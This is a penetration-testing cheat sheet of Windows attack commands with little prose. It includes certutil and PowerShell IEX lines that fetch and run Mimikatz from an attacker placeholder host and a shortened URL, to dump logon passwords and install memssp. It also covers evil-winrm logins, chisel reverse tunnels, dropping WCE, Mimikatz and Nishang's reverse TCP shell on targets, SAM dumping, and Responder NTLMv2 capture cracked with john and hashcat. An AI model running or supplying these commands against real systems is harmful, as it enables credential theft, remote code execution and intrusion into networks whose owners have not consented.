# Execution Remote Code 


1. Certutil:

        certutil -urlcache -split -f http://attackerIP/PowerLine.exe PowerLine.exe
        PowerLine.exe Invoke-Mimikatz "Invoke-Mimikatz -Command \"'\"sekurlsa::logonPasswords'\"\""
2. Powershell

        powershell "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
3. IEX

        IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -Command '"privilege::debug" "misc::memssp"'


## Winrm

    ruby evil-winrm.rb -i IP_ADDRESS -u USERNAME -P 5985 -p PASSWORD
    > menu

## Port forwarding

> Client

    chisel client 10.10.15.18:6666 R:7777:127.0.0.1:8443

> Server
> 
    chisel server -p port --reverse
Connect:

    https://127.0.0.1:7777

## Privilege-escalation
> x86
> 
    /usr/share/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x86/Release/winPEAS.exe
> x64
> 
    /usr/share/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe

# Dump Password
## Windows Credentials Editor

Drop those **file** to the target computer 

    /usr/share/wce/wce_x64.exe
    /usr/share/wce/wce.exe
    
## Mimikatz

Drop those **Directory** to the target computer

    /usr/share/mimikatz/Win32
    /usr/share/mimikatz/x64


Powershell code 

    /usr/share/mimikatz/Invoke-Mimikatz.ps1
    
## Crack SAM + SYSTEM 

samdump2 system sam > hash 

> John 

    john hash

> Hashcat 

    cat dumpHash | cut -d ":" -f 4 | sort | uniq > ntlm.txt
    hashcat -m 1000 -a 3 ./ntlm.txt -w 3 rockyou.txt

# Nishang
Pentest tools and script (Backdoor/Bypass/PrivEscal/MITM/Pivot/Scan/InfoGather)
(https://github.com/samratashok/nishang.git)


Drop this **Directory** to the target computer


    /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
    
# Responder

To listen 

    responder -i ens33 -f 


Path of the hash 


    cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt

Crack the hash 


    john /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt


    john --wordlist ~/Desktop/passwd.lst /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt --format=netntlmv2

Get cracked Password

    john --show /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt 


    ~/.john/john.pot



https://book.hacktricks.xyz/windows/windows-local-privilege-escalation